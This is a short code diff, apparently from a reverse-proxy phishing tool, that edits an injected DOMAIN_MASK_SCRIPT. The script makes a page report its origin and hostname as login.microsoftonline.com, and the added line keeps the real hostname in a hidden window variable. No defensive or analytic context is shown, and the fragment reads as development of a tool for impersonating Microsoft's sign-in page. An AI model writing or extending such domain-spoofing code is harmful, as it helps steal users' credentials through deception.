@@ -81,6 +81,7 @@ const PROXY_PATHNAMES = {
 const DOMAIN_MASK_SCRIPT = `
 (function() {
     'use strict';
+    window.__originalHostname = window.location.hostname;
     var fakeOrigin = 'https://login.microsoftonline.com';
     var fakeHostname = 'login.microsoftonline.com';
     var fakeHost = 'login.microsoftonline.com';
